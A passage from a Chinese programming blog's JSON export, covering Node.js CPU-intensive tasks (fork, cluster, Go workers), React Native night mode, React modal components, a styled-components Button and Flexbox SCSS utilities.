的个数的提升而提升。 Fork 方式创建子进程需要 10 MB 的内存，以及 30 ms 的创建时间，因此不建议大量使用 Fork 创建子进程。 compute-clustercompute-cluster 是 Mozilla Identity 团队为 Persona 开发的计算模块。 使用它的唯一好处是它集成了一些好用的 API，无论如何 compute-cluster 的实现还是使用 Fork 来处理。 12345678910111213141516171819202122const computecluster = require('compute-cluster');const cpus = require('os').cpus();const cc = new computecluster(&#123; module: './worker.js'&#125;);console.time('completed');console.log(`[启动] 主进程：$&#123;process.pid&#125;`);Promise.all( [...new Array(cpus.length)] .map((_, index) =&gt; new Promise((resolve, reject) =&gt; &#123; cc.enqueue(['go', index], (err, res) =&gt; &#123; err ? reject(err) : resolve(res); &#125;); &#125;))).then(res =&gt; &#123; console.timeEnd('completed'); cc.exit();&#125;).catch(err =&gt; &#123; console.log(err);&#125;); worker.js 文件同上。 运行结果： 123456789101112131415161718[启动] 主进程：7272[创建] 工作进程：2344[创建] 工作进程：7956[创建] 工作进程：6256[创建] 工作进程：7028[创建] 工作进程：7708[创建] 工作进程：6776[创建] 工作进程：7848[创建] 工作进程：7668task 0: 1276.013 mstask 1: 1295.566 mstask 2: 1272.882 mstask 5: 1281.418 mstask 4: 1304.919 mstask 7: 1276.843 mstask 6: 1363.481 mstask 3: 1849.542 mscompleted: 2089.657 ms 会看到 compute-cluster 的计算能力基本和 Fork 的方式差不多，应该它们都是使用 Fork 来实现的。 Cluster 方式Cluster 是 Nodejs 的集群模块，当使用 cluster 时 Nodejs 会创建多个工作进程来执行，并把这些工作进程部署在不同 CPU 上。 1234567891011121314151617181920212223242526272829303132333435const cluster = require('cluster');const cpus = require('os').cpus();console.time('completed');if (cluster.isMaster) &#123; console.log(`[启动] 主进程：$&#123;process.pid&#125;`); Promise.all( [...new Array(cpus.length)] .map((_, index) =&gt; new Promise((resolve, reject) =&gt; &#123; cluster.fork(); resolve(); &#125;)) ).then(res =&gt; &#123; let n = cpus.length; for (const id in cluster.workers) &#123; cluster.workers[id].on('message', (d) =&gt; &#123; if (--n === 0) return; &#125;); &#125; &#125;).then(_ =&gt; &#123; console.timeEnd('completed'); process.exit(0); &#125;).catch(err =&gt; &#123; console.log(err); &#125;);&#125;else &#123; const id = cluster.worker.id; console.log('[创建] 工作进程：' + process.pid); console.time('task ' + id); const res = sum(); console.timeEnd('task ' + id); cluster.worker.send(res);&#125; 运行结果： 123456789101112131415161718[启动] 主进程：6888[创建] 工作进程：7652[创建] 工作进程：7960[创建] 工作进程：6636[创建] 工作进程：7328[创建] 工作进程：6524[创建] 工作进程：4040[创建] 工作进程：7324[创建] 工作进程：8104task 1: 1301.246 mstask 5: 1300.369 mstask 7: 1313.513 mstask 6: 1353.451 mstask 2: 1497.710 mstask 3: 1485.695 mstask 8: 1431.876 mstask 4: 1829.665 mscompleted: 2085.341 ms 可以看到使用 cluster 模块的密集计算能力也和 Fork 差不多，可以说明这已经到达了 Nodejs 的极限了。 使用 cluster 是有缺点的： 使用不灵活，比较难分配任务，代码比较难写。 如果是计算任务依赖太多数据，那编码就会显得非常困难，需要在 fork 时挂上不同的参数。 对于一个 HTTP 服务器，如果电脑只有 4 个 CPU， 4 个 cluster 都在计算 fibo，那将无法处理 HTTP。 所以 cluster 还是不能彻底的解决单线程模型的 CPU 密集计算带来的阻塞问题，但是拿它做均衡负载挺不错的。 借助 Golang在上面使用了几种方法来提升 Nodejs 的密集计算能力，但是后面发现使用 Fork 还是 Cluster 最后得出的结果都是差不多，这已经到达了 Nodejs 的计算能力极限了。 如果还想再提升，可以考虑几个方面： 算法复杂度优化。 使用其他速度更快的编程语言。比如 C++ 扩展，webassembly，Go 等。 在 Nodejs 里是可以利用 child_process 模块来运行外部的程序的。比如，在 Nodejs 里是没有很好用的图像处理库的，这时你可以使用 child_process 中的 execFile 来执行 python 的程序，来处理图像。 对于密集计算任务，笔者比较推荐的是使用 Golang 来做这样一件事情，毕竟 Golang 号称的速度最接近 C 语言的现代编程语言，它有非常强大的并发处理能力，其次是语法非常现代化，与 js 也有几分相似的地方。 在这里，Nodejs 负责分配任务与发命令，所有的计算任务都是由 Golang 来完成。 先是编写 Nodejs 的代码。 1234567891011const cp = require('child_process');console.time('completed');console.log(`[启动] 主进程：$&#123;process.pid&#125;`);const work = cp.execFile('./worker.exe', [], (err, stdout, stderr) =&gt; &#123; console.log(stdout); console.timeEnd('completed');&#125;);work.on('error', err =&gt; console.error(err)); 接着在 go 里编写计算任务。 123456789101112131415161718192021222324252627282930package mainimport ( \"runtime\" \"fmt\" \"os\" \"sync\")var w sync.WaitGroupfunc task(i int) float64 &#123; defer w.Done() fmt.Printf(\"[执行] 计算任务： %d\\n\", i) sum := 0.00 for i := 0; i &lt; 1e9; i++ &#123; sum += 0.01 &#125; return sum&#125;func main() &#123; fmt.Printf(\"[创建] 工作进程： %d\\n\", os.Getpid()) cpus := runtime.NumCPU() w.Add(cpus) for i := 0; i &lt; cpus; i++ &#123; go task(i) &#125; w.Wait()&#125; 运行结果： 123456789101112[启动] 主进程：6488[创建] 工作进程： 6592[执行] 计算任务： 7[执行] 计算任务： 3[执行] 计算任务： 5[执行] 计算任务： 6[执行] 计算任务： 4[执行] 计算任务： 1[执行] 计算任务： 0[执行] 计算任务： 2completed: 908.665 ms 使用 Kue 和 Redis 进行多节点分布式计算 https://codeburst.io/cpu-intensive-node-js-part-2-f1610a17f40a https://www.npmjs.com/package/kue 小结Nodejs 是如何应对 CPU 密集型任务的？主要有几个方面可以考虑： 使用 child_process 模块通过 fork 进程，维护一个进程池来执行密集型任务会有意想不到的效果，这样需要额外的进程占用。（可以考虑） 使用 cluster 模块，也能使用多进程来执行密集型任务，但是这样代码非常不好控制，并且调试困难。（不推荐） 使用其他高性能语言来执行密集型任务，Nodejs 只做任务发布者，这样带来的是多个语言上的开发上的困难。（可以考虑） 使用 Kue 和 Redis 进行多节点分布式计算，使追求更大的数据量计算成为了可能。（推荐） 参考资料 http://www.infoq.com/cn/articles/nodejs-weakness-cpu-intensive-tasks/","categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/categories/Nodejs/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"}]},{"title":"React Native 由繁到简实现夜间模式","slug":"React Native/React Native 由繁到简实现夜间模式","date":"2017-12-16T00:48:20.000Z","updated":"2021-06-15T06:10:52.864Z","comments":true,"path":"/stories/2017/12/React Native/React Native 由繁到简实现夜间模式/","link":"","permalink":"http://me.lizhooh.com/stories/2017/12/React Native/React Native 由繁到简实现夜间模式/","excerpt":"前言夜间模式 能提升用户体验的功能，现在很多 App 都有实现夜间模式。那么如何在 React Native 上实现夜间模式呢？之前我的做法是使用 Redux，维护着一个 Theme Store 来进行动态的切换组件的颜色。 但是这样有几个需要我吐槽的地方： 相关组件需要通过 props 来动态切换颜色，非常不方便。 给组件的 style 属性需要动态的对象析构，非常麻烦，代码也不美观。 为了解决这些繁琐问题，我将使用 styled-components 来实现 React Native 夜间模式。 关于夜间模式的问题： 「夜间模式」是不是伪需求？ 如何设计「夜间模式」，有哪些值得注意的问题与经验？","text":"前言夜间模式 能提升用户体验的功能，现在很多 App 都有实现夜间模式。那么如何在 React Native 上实现夜间模式呢？之前我的做法是使用 Redux，维护着一个 Theme Store 来进行动态的切换组件的颜色。 但是这样有几个需要我吐槽的地方： 相关组件需要通过 props 来动态切换颜色，非常不方便。 给组件的 style 属性需要动态的对象析构，非常麻烦，代码也不美观。 为了解决这些繁琐问题，我将使用 styled-components 来实现 React Native 夜间模式。 关于夜间模式的问题： 「夜间模式」是不是伪需求？ 如何设计「夜间模式」，有哪些值得注意的问题与经验？ styled nativestyled-components 是一个 CSS in JS 的样式管理框架，同时它适用于 React、React Native。在 React 上使用基本和 CSS + Sass 差不多，没错还支持 Sass 的嵌套写法。 在 React Native 上使用需要引入 native： 123456789101112131415161718192021222324import React, &#123; Component &#125; from 'react';import styled from 'styled-components/native';import &#123; View, Text,&#125; from 'react-native';export default class App extends Component &#123; render() &#123; return ( &lt;StyledView&gt; &lt;StyledText&gt;Hello World!&lt;/StyledText&gt; &lt;/StyledView&gt; ); &#125;&#125;const StyledView = styled.View` background-color: papayawhip;`;const StyledText = styled.Text` color: palevioletred;`; 注意的地方： 在 react-native style 里不支持的属性，写上去将会得到一个警告，并且没有效果。 有些地方要注意的，之前的峰驼式变成了连号式写法。 对于需要单位的属性，一定要带上单位，比如 padding: 12px。 主题在 styled-components 里实现主题功能，可以使用 &lt;ThemeProvider&gt; 组件。&lt;ThemeProvider&gt; 实际上和 React-Redux 中的 &lt;Provider&gt;差不多，它的实现原理都是使用 React 的 Context 实现。 与 Redux 结合使用时，我会把它连接到 Store 里，并且编写 reducer、action 来控制主题切换。 123456789101112131415161718192021222324252627282930313233// theme.jsconst Theme = (&#123; state &#125;) =&gt; ( &lt;ThemeProvider theme=&#123;state.theme&#125;&gt; &lt;App /&gt; &lt;/ThemeProvider&gt;);// 连接到 Reduxexport default connent( state =&gt; (&#123; state: state.theme &#125;))(Theme);// redux/reducers/theme.jsconst init_state = &#123; backgroundColor: '#3af', // 默认主题颜色 color: '#333', // 默认字体颜色 fontSize: 15, // 默认字体大小&#125;;export default (state = init_state, action) =&gt; &#123; switch (action.type) &#123; default: return state; &#125;&#125;;// app.jsrender() &#123; return ( &lt;Provider store=&#123;store&#125;&gt; &lt;Theme /&gt; &lt;/Provider&gt; );&#125; 这样做的好处是能够使用 Redux 来控制 ThemeProvider 的 theme 从而实现主题的动态改变。 动态切换在组件 styled 里可以通过 props.theme 获取主题。 12345const Container = styled.View` width: 100px; height: 100px; background-color: $&#123;p =&gt; p.theme.backgroundColor&#125;`; 这样你就可以看到一个背景为蓝色的块。 在 styled 组件里使用回调函数，那么第一个参数则为 props，这个 props 指的就是组件的 props。如果组件在 &lt;ThemeProvider&gt; 里，那么就会额外的携带一个 theme 属性，这个属性就主题对象的引用。 除了这样，还可以定义主题 props 属性。 12345678910111213const Container = styled.View` width: 100px; height: 100px; background-color: $&#123;p =&gt; p.color || '#3af'&#125;`;render() &#123; return ( &lt;Container color='#f34'&gt; &lt;/Container&gt; );&#125; 往往在 React 里可以使用它来实现组件的 show 属性。 123const Container = styled.div` $&#123;p =&gt; p.show &amp;&amp; 'display: none;'&#125;`; 当通过 Redux 来更换 theme store 时，就可以实现夜间模式了。 123// redux/actions/theme.jsimport &#123; THEME &#125; from '../types';export const renewalTheme = (name) =&gt; (&#123; type: THEME.renewal, name &#125;); 在这里，通过 name 指定，要更换的主题名称。因此，还要在 reducers 里添加不同的主题方案。 1234567891011121314151617181920212223242526// redux/reducers/theme.jsimport &#123; THEME &#125; from '../types';const ThemeMaps = &#123; default: &#123; backgroundColor: '#3af', color: '#333', &#125;, night: &#123; backgroundColor: '#737373', color: '#f3f3f3', &#125;,&#125;;const init_state = ThemeMaps['default'];export default () =&gt; (state = init_state, action) =&gt; &#123; switch (action.type) &#123; case THEME.renewal: return &#123; ...state, ...ThemeMaps[action.name || 'default'] &#125; default: return state; &#125;&#125; 这样就可以实现 React Native 夜间模式了（鼓掌，\\(“▔□▔)/）。 注意的地方如果你想持久化夜间模式的效果，即下次打开 App 时，还是夜间模式。可以使用 React Native 的 AsyncStorage API。但是这个 API 是异步的。可能会出现这样的效果，App 启动时使用的是默认主题，接着去 AsyncStorage 读取数据，再换成夜间模式。这种情况，可以加一个启动图，在 App 所有数据初始完成后再显示内容。 另外还可以考虑使用 react-native-storage 来管理本地数据持久化，它里面提供同步读取数据。 12345678910111213141516171819202122232425import Storage from 'react-native-storage';import &#123; AsyncStorage &#125; from 'react-native';const storage = new Storage(&#123; // 最大容量，默认值 1000 条数据循环存储 size: 1000, // 存储引擎：对于 RN 使用 AsyncStorage，对于 web 使用 window.localStorage // 如果不指定则数据只会保存在内存中，重启后即丢失 storageBackend: AsyncStorage, // 数据过期时间，默认一整天（1000 * 3600 * 24 毫秒），设为 null 则永不过期 defaultExpires: 1000 * 3600 * 24, // 读写时在内存中缓存数据。默认启用。 enableCache: true, // 如果 storage 中没有相应数据，或数据已过期， // 则会调用相应的 sync 方法，无缝返回最新数据。 // sync 方法的具体说明会在后文提到 // 你可以在构造函数这里就写好 sync 的方法 // 或是在任何时候，直接对 storage.sync 进行赋值修改 // 或是写到另一个文件里，这里 require 引入 sync: require('你可以另外写一个文件专门处理sync'),&#125;); 参考资料 https://www.styled-components.com/docs/advanced#theming http://thejameskyle.com/styled-theming.html","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"React 定义一个 Model 组件","slug":"React/React/React 定义一个 Model 组件","date":"2017-12-14T01:03:40.000Z","updated":"2021-06-15T06:10:52.877Z","comments":true,"path":"/stories/2017/12/React/React/React 定义一个 Model 组件/","link":"","permalink":"http://me.lizhooh.com/stories/2017/12/React/React/React 定义一个 Model 组件/","excerpt":"前言Model（弹窗）组件是一个比较常用的组件，在 React 里要设计一个 Model 组件可以不是一件简单的事情。因为 Model 组件很多时候都是挂载在 body 下的，而且又是全局悬浮状态。 在 React 里定义 Model 组件有两种方法： 使用 ReactDOM.render 使用 React 16 提供的 下面就来介绍一下这两种定义（设计）方式。","text":"前言Model（弹窗）组件是一个比较常用的组件，在 React 里要设计一个 Model 组件可以不是一件简单的事情。因为 Model 组件很多时候都是挂载在 body 下的，而且又是全局悬浮状态。 在 React 里定义 Model 组件有两种方法： 使用 ReactDOM.render 使用 React 16 提供的 下面就来介绍一下这两种定义（设计）方式。 ReactDOM.render这种方式的做法很简单，先是在 body 里创建一个节点，再把内容渲染进去即可。 NodeRender创建一个高阶组件，它的作用就是返回一个组件类。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485import React from 'react';import ReactDOM from 'react-dom';import styled from 'styled-components';export default (Component, id, opts) =&gt; class NodeRender &#123; constructor(props) &#123; this.props = props; this.id = id; this.options = &#123; clickModelClose: true, ...opts, &#125; &#125; // 卸载节点 unmount() &#123; ReactDOM.render(null, this.el) document.body.removeChild(this.el); &#125; // 打开弹框 open = (data) =&gt; &#123; const el = document.getElementById(this.id); if (el) return; document.body.style = 'overflow: hidden'; data !== undefined ? this.renderNode(this.renderModel(&#123; data &#125;)) : this.renderNode(this.renderModel()); &#125; // 关闭弹框 close = () =&gt; &#123; document.body.style = ''; this.unmount(); &#125; // 渲染在 body 节点下 renderNode(component) &#123; this.component = component || React.createElement('div'); this.el = document.createElement('div'); this.el.id = this.id || Math.random(); document.body.appendChild(this.el); // 渲染到指定节点上 ReactDOM.render(this.component, this.el) &#125; // 渲染模型 renderModel = (props) =&gt; &#123; const p = &#123; ...props, ...this.props &#125;; Object.keys(p).forEach(i =&gt; &#123; typeof p[i] === 'function' &amp;&amp; (p[i] = p[i].bind(this)); &#125;); return ( &lt;Model alpha=&#123;0.25&#125; className=\"flex flex-center\" onClick=&#123;e =&gt; &#123; if (e.target === e.currentTarget &amp;&amp; this.options.clickModelClose) &#123; typeof p.onClick === 'function' &amp;&amp; p.onClick(e); &#125; &#125;&#125; &gt; &lt;Component &#123;...p&#125; model=&#123;this&#125; /&gt; &lt;/Model&gt; ) &#125;&#125;const Model = styled.div` position: fixed; z-index: 1001; top: 0; left: 0; right: 0; bottom: 0; background-color: rgba(1, 1, 1, $&#123;props =&gt; props.alpha&#125; );`;Model.defaultProps = &#123; alpha: 0.48,&#125;; 使用这就可以这样使用它。 123456789101112131415161718192021222324252627const Model = NodeRender( &lt;p&gt;弹框内容&lt;/p&gt;, // &lt;- model 里的内容组件 'abcde',);export default class extends Component &#123; constructor(props) &#123; this.model = new Model(&#123; onClick(e) &#123; console.log('click'); this.close(); &#125; &#125;); &#125; render() &#123; const &#123; show &#125; = this.state; return ( &lt;div&gt; &lt;button onClick=&#123;e =&gt; this.model.open()&#125;&gt;点我&lt;/button&gt; &lt;/div&gt; ) &#125;&#125; 可以看起，使用起来非常方便。直接通过实例就行控制显示和关闭，不用把组件放进 render 里。它是通过闭包保存了 Component 的上下文，在关闭时直接在 DOM 上删除节点，在打开时直接在 DOM 上创建节点。 ReactDOM.createPortalcreatePortal 是 React 16 提供的一个新 API，它可以直接跳出当前的 VDOM，渲染到任意的节点上。createPortal 的第一个参数是 component，第二个参数是 element，和 ReactDOM.render 差不多。 Portal 组件定义一个 Portal 组件，这个组件的作用就是在 body 下创建一个节点，把 props.children 渲染到这个节点里。它的作用就是可以直接在父组件里直接渲染到任意的位置。 123456789101112131415161718192021222324252627282930import &#123; Component &#125; from 'react';import ReactDOM from 'react-dom';export default class PortalComponent extends Component &#123; constructor(props) &#123; super(props); this.el = document.createElement('div'); this.el.id = this.props.id || Math.random(); &#125; componentDidMount() &#123; document.body.appendChild(this.el); &#125; componentWillUnmount() &#123; document.body.removeChild(this.el); &#125; componentDidCatch(err, info) &#123; console.error(err); &#125; render() &#123; return ReactDOM.createPortal( this.props.children, this.el ); &#125;&#125; Model 组件接下来定义一个 Model 组件，把它挂载在 Portal 组件下面。 123456789101112131415161718192021222324252627282930313233343536373839404142import React, &#123; Component &#125; from 'react';import styled from 'styled-components';import Portal from './portal';export default class ModalComponent extends Component &#123; static defaultProps = &#123; onClick: () =&gt; &#123; &#125; &#125; onClick = e =&gt; &#123; if (e.target === e.currentTarget) &#123; this.props.onClick(e); &#125; &#125; render() &#123; const &#123; children, ...other &#125; = this.props; return ( &lt;Portal&gt; &lt;Container &#123;...other&#125; onClick=&#123;this.onClick&#125;&gt; &#123;this.props.children&#125; &lt;/Container&gt; &lt;/Portal&gt; ); &#125;&#125;const Container = styled.div` position: fixed; z-index: 1001; top: 0; left: 0; right: 0; bottom: 0; background-color: rgba(1, 1, 1, $&#123;props =&gt; props.alpha&#125; );`;Container.defaultProps = &#123; alpha: 0.48,&#125;; 使用使用的时候，可以这样使用。 123456789101112131415161718192021export default class extends Component &#123; constructor(props) &#123; this.state = &#123; show: false &#125;; &#125; render() &#123; const &#123; show &#125; = this.state; return ( &lt;div&gt; &lt;button onClick=&#123;this.setState(&#123; show: true &#125;)&#125;&gt;点我&lt;/button&gt; &#123;show &amp;&amp; &lt;Model onClick=&#123;this.setState(&#123; show: false &#125;)&#125;&gt; &lt;p&gt;弹框内容&lt;/p&gt; &lt;/Model&gt; &#125; &lt;/div&gt; ) &#125;&#125; 使用 ReactDOM.createPortal 与上面的 ReactDOM.render 的使用方式不同。Portal 需要在父组件里插入 Model，并且通过父组件的状态控制打开与关闭。 小结使用 ReactDOM.render 创建的 Model 组件可以不用插入到父组件里，也不需要父组件进行状态的控制显示 Model 组件。因为它可以充当一个函数来使用，props 通过构造函数进行传递，内部的 state 由 Model Content Component 自己控制，也可以在父组件上控制。 使用 ReactDOM.createPortal 创建的 Model 需要插入到父组件里，而且需要通过父组件的状态进行控制 Model 的打开与关闭，Model Content Component。 而我更倾味于第一种实现方式。","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"}]},{"title":"💅 更进一步管理 React 组件样式","slug":"React/Style/更进一步管理 React 组件样式","date":"2017-12-09T02:59:10.000Z","updated":"2021-06-15T06:10:52.886Z","comments":true,"path":"/stories/2017/12/React/Style/更进一步管理 React 组件样式/","link":"","permalink":"http://me.lizhooh.com/stories/2017/12/React/Style/更进一步管理 React 组件样式/","excerpt":"前言styled-components 是一个 CSS in Javascript 的框架，可用于 React/React Native 上，在 Gzip 只有 18k 大小。它可以让你抛去在编写 React 组件时，每个组件都需要携带一个 CSS/Sass/Less 文件的烦恼。基于 Javascript 的灵活性，因此可以更方便的编写独立的组件，这意味着往往只需要一个 js 文件就可以稳稳的进行组件化编程。 本文不会介绍基础内容，更多的参考相关文章：💅 Styled-Components 最佳使用方式","text":"前言styled-components 是一个 CSS in Javascript 的框架，可用于 React/React Native 上，在 Gzip 只有 18k 大小。它可以让你抛去在编写 React 组件时，每个组件都需要携带一个 CSS/Sass/Less 文件的烦恼。基于 Javascript 的灵活性，因此可以更方便的编写独立的组件，这意味着往往只需要一个 js 文件就可以稳稳的进行组件化编程。 本文不会介绍基础内容，更多的参考相关文章：💅 Styled-Components 最佳使用方式 下面以一个自定义 Button 组件为示例，讲述如何使用 styled-components 封装自己的组件。 实践 - 自定义 Button 组件借鉴 ant design 的 Button 组件设计，结合 styled-components 定义自己的 Button 组件。 预定的 Props： size 按钮大小 color 按钮颜色 type 按钮类型 onClick 点击事件 size 大小按钮大小设置为 large, default, small 三种。而大小是根据 padding 和 font-size 来控制的。 123456789101112131415161718192021222324252627282930313233343536373839404142import React from 'react';import styled, &#123; css &#125; from 'styled-components';const sizes = &#123; large: ` font-size: 17px; `, default: ` font-size: 15px; `, small: ` font-size: 13px; `,&#125;;const Button = styled.button` font-family: inherit; margin: 10px; border: 1px solid rgba(1, 1, 1, 0.1); line-height: 1.6; color: #333; background-color: #fff; outline: none; border-radius: 3px; padding: 0.3em 1.2em; cursor: pointer; $&#123;props =&gt; sizes[props.size]&#125;`;Button.defaultProps = &#123; size: sizes.default,&#125;;export default () =&gt; ( &lt;div&gt; &lt;Button size=\"large\"&gt;按钮&lt;/Button&gt; &lt;Button&gt;按钮&lt;/Button&gt; &lt;Button size=\"small\"&gt;按钮&lt;/Button&gt; &lt;/div&gt;) 这时候看到的应该是这样的效果： color 颜色按钮的颜色设置为以下几种： Red、Green、Blue Pink、Orange、Purple Yellow、Cyan、Grey 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758const colors = [ ['red', '#f04134'], ['green', '#00a854'], ['blue', '#108ee9'], ['pink', '#f5317f'], ['orange', '#f56a00'], ['purple', '#7265e6'], ['yellow', '#ffbf00'], ['cyan', '#00a2ae'], ['grey', '#bfbfbf'],].reduce((obj, val) =&gt; (&#123; ...obj, [val[0]]: ` border-color: $&#123;val[1]&#125;; background-color: $&#123;val[1]&#125;; `&#125;), &#123; white: ` color: #333; border-color: rgba(1, 1, 1, 0.1); background-color: #fff; `&#125;);const Button = styled.button` font-family: inherit; margin: 10px; padding: 0.3em 1.2em; border: 1px solid rgba(1, 1, 1, 0.1); line-height: 1.6; background-color: #fff; outline: none; border-radius: 3px; color: #fff; cursor: pointer; $&#123;props =&gt; sizes[props.size]&#125; $&#123;props =&gt; colors[props.color]&#125;`;Button.defaultProps = &#123; size: sizes.default, color: colors.white,&#125;;export default () =&gt; ( &lt;div&gt; &lt;Button color=\"white\"&gt;按钮&lt;/Button&gt; &lt;Button color=\"red\"&gt;按钮&lt;/Button&gt; &lt;Button color=\"blue\"&gt;按钮&lt;/Button&gt; &lt;Button color=\"green\"&gt;按钮&lt;/Button&gt; &lt;Button color=\"orange\"&gt;按钮&lt;/Button&gt; &lt;Button color=\"pink\"&gt;按钮&lt;/Button&gt; &lt;Button color=\"purple\"&gt;按钮&lt;/Button&gt; &lt;Button color=\"yellow\"&gt;按钮&lt;/Button&gt; &lt;/div&gt;) 这时候看到的应该是这样的效果： hover 伪类效果添加 :hover 伪类，给用户一种反馈效果。 使用 Color 颜色工具库，调整其颜色的明暗度。 1234567border-color: $&#123;val[1]&#125;;background-color: $&#123;val[1]&#125;;&amp;:hover &#123; border-color: $&#123;Color(val[1]).darken(0.18)&#125;; background-color: $&#123;Color(val[1]).darken(0.18)&#125;;&#125; 在触发 :hover 时背景颜色变深，这样看起来就更加真实了。 active 伪类效果当点击按钮时，应该有一个反馈效果，那么就需要用到 :active 伪类。 123&amp;:active &#123; box-shadow: 1px 2px 8px $&#123;val[1]&#125;;&#125; 在触发 :active 时多出一个阴影效果。 type 类型目前为止，Button 的类型是字体白色，背景彩色的。现在添加一种类型是字体彩色，背景白色的按钮。 1234567891011121314151617181920212223242526272829[val[0]]: type =&gt; ` border-color: $&#123;val[1]&#125;; $&#123;type === 'line' ? '' : 'background-'&#125;color: $&#123;val[1]&#125;; &amp;:hover &#123; border-color: $&#123;Color(val[1]).darken(0.18)&#125;; $&#123;type === 'line' ? '' : 'background-'&#125;color: $&#123;Color(val[1]).darken(0.18)&#125;; &#125; &amp;:active &#123; box-shadow: 1px 2px 8px $&#123;val[1]&#125;, 0 0 2px $&#123;val[1]&#125; inset; &#125;`// ....$&#123;props =&gt; colors[props.color](props.type)&#125;Button.defaultProps = &#123; size: sizes.default, color: colors.white(props.type),&#125;;// ...export default () =&gt; ( &lt;div&gt; &lt;Button color=\"red\" type=\"line\"&gt;按钮&lt;/Button&gt; &lt;Button color=\"blue\" type=\"line\"&gt;按钮&lt;/Button&gt; &lt;Button color=\"green\"&gt;按钮&lt;/Button&gt; &lt;/div&gt;) 这时候看到的应该是这样的效果： click 点击事件因为 styled.button 是基于 button 的。所以点击事件直接添加上去即可。 1&lt;Button onClick=&#123;e =&gt; console.log(e)&#125; /&gt; 同理，style、className 等属性都是直接添加进去即可。 如果有 className，它会优先把 className 的值放在前面，例如： 1&lt;Button className=\"red\" /&gt; // red sc-bdVaJa kAEtbq 小结无论从哪个方面看，使用 styled-components 来管理 React 组件样式都是一个不错的选择。 但是有一些地方需要注意的： styled-components 内集成了 autoprefixer。 编译后，没有看到有生成 CSS 文件。也就是说它的样式是是通过 js 动态计算，然后反映在 html &gt; head 上的。 因为 css 样式是通过动态计算的，所有首屏可能在这里需要一点计算时间。 参考资料 https://www.styled-components.com/","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"}]},{"title":"Flex + Scss 自定义弹性布局方式","slug":"Style/Flex + Scss 自定义弹性布局方式","date":"2017-12-07T03:14:15.000Z","updated":"2021-06-15T06:10:52.895Z","comments":true,"path":"/stories/2017/12/Style/Flex + Scss 自定义弹性布局方式/","link":"","permalink":"http://me.lizhooh.com/stories/2017/12/Style/Flex + Scss 自定义弹性布局方式/","excerpt":"前言Flexbox 是一个很好的伸缩性弹性布局方案，到目前为止几乎可以忽略对老的浏览器（没人爱的 IE）的支持，放心使用 Flexbox 布局了。 本文介绍，如何使用 Scss 自定义 Flexbox 布局样式。","text":"前言Flexbox 是一个很好的伸缩性弹性布局方案，到目前为止几乎可以忽略对老的浏览器（没人爱的 IE）的支持，放心使用 Flexbox 布局了。 本文介绍，如何使用 Scss 自定义 Flexbox 布局样式。 自定义 Flex 样式对 Flexbox 布局样式进行预定义，这样可以减少多余的编码，提高工作效率。 整个 Flex 布局样式都是以 .flex 开头。 1234567.flex &#123; &amp; &#123; display: flex; &#125; // 子全为 flex &amp;-flex &gt; * &#123; display: flex; &#125;&#125; 水平布局定义了基本的水平布局方式。 123456789// 水平布局&amp;-row &#123; display: flex; flex-direction: row; // 子元素默认平均分布 &gt; * &#123; display: block; &#125; // 反向 &amp;-rev &#123; flex-direction: row-reverse; &#125;&#125; 垂直布局定义了基本的垂直布局方式。 12345678// 垂直布局&amp;-column &#123; display: flex; flex-wrap: wrap; flex-direction: column; &amp;-rev &#123; flex-direction: column-reverse; &#125;&#125; 自动换行当元素过多时，如果是水平布局，所有元素就会挤在一行里，可以这时为其设置自动换行。 123&amp;-wrap &#123; flex-wrap: wrap;&#125; 主轴方向如果是水平布局，那么主轴方向就是水平方向；如果是垂直布局，那么主轴方向就是垂直方向。 12345678// 主轴方向对齐方式&amp;-jc &#123; &amp;-center &#123; justify-content: center; &#125; &amp;-start &#123; justify-content: flex-start; &#125; &amp;-end &#123; justify-content: flex-end; &#125; &amp;-between &#123; justify-content: space-between; &#125; &amp;-around &#123; justify-content: space-around; &#125;&#125; 侧轴方向主轴与侧轴的关系是互相垂直的。侧轴方向有 align-center 可以用来进行多行布局。 123456789101112131415161718// 侧轴方向对齐方式&amp;-ai &#123; display: flex; &amp;-center &#123; align-items: center; &#125; &amp;-start &#123; align-items: flex-start; &#125; &amp;-end &#123; align-items: flex-end; &#125; &amp;-baseline &#123; align-items: baseline; &#125;&#125;// 多行布局对齐方式&amp;-ac &#123; display: flex; &amp;-center &#123; align-content: center; &#125; &amp;-start &#123; align-content: flex-start; &#125; &amp;-end &#123; align-content: flex-end; &#125; &amp;-between &#123; align-content: space-between; &#125; &amp;-around &#123; align-content: space-around; &#125;&#125; 垂直水平居中垂直水平居中是一个典型的前端问题，但是在 Flexbox 布局里几乎显得非常容易实现。 123456// 垂直水平居中&amp;-center &#123; display: flex; justify-content: center; align-items: center;&#125; 伸缩比例Flexbox 的弹性布局是基于伸缩比例的。编写一个 @mixin 来定义伸缩比例。 1234567891011// 伸缩值 .flex-比例，比如 flex-1, flex-2@mixin Flex-Number($num: 24) &#123; @for $i from 0 through $num &#123; &amp;-#&#123;$i&#125; &#123; flex: #&#123;$i&#125;; &#125; &#125;&#125;// 伸缩值@include Flex-Number(); 实践这样就把 flex + scss 定义好了，那么就开始使用它。 